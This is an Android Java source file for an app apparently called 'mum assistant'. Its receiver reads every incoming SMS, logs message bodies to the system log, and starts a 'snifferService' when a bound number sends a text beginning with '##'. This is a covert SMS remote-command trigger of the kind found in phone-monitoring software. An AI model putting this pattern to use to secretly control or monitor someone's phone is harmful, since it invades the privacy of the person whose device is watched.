package com.android.mumassistant.control;

import java.util.ArrayList;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.telephony.SmsMessage;
import android.util.Log;

public class MmsSniffer extends BroadcastReceiver{

	String content;
	String address;
	String bindaddress;
	String targcontent;

	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		
		SharedPreferences shp = PreferenceManager.getDefaultSharedPreferences(context);
		boolean run_app = shp.getBoolean("run_app", false);
		if(false == run_app){
			Log.v("zjm","zjm PreferenceManager return");
			return;
		}
		if("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())){
			
			
			Object[] pdus = (Object[]) intent.getExtras().get("pdus");
			for (Object pdu : pdus) {
				SmsMessage message = SmsMessage.createFromPdu((byte[]) pdu);
				
				
				content = message.getMessageBody();
				Log.v("zjm","zjm content:"+content);
				
				address = message.getOriginatingAddress();
				 
			}
			bindaddress = shp.getString("number_edit", "0000");
			targcontent = content.substring(0,2);

			try{
				if((address.indexOf(bindaddress) >= 1) && ("##".equals(targcontent))){
					
					if(isWorked(context)){
						Intent intent_stop = new Intent(context,snifferService.class);
						context.stopService(intent_stop);
					}
					
					Intent intentsniffer = new Intent(context,snifferService.class);
					Bundle snifferbundle = new Bundle();
					snifferbundle.putString("Message", content);
					intentsniffer.putExtras(snifferbundle); 
					context.startService(intentsniffer);
				}
			}catch(Exception e){
				Log.v("zjm","zjm exception:" + e);
			}
		}
	}
	
	public static boolean isWorked(Context context)
	 {
	  ActivityManager myManager=(ActivityManager)context.getSystemService(Context.ACTIVITY_SERVICE);
	  ArrayList<RunningServiceInfo> runningService = (ArrayList<RunningServiceInfo>) myManager.getRunningServices(30);
	  for(int i = 0 ; i<runningService.size();i++)
	  {
	   if(runningService.get(i).service.getClassName().toString().equals("com.android.mumassistant.control.snifferService"))
	   {
	    return true;
	   }
	  }
	  return false;
	 }
}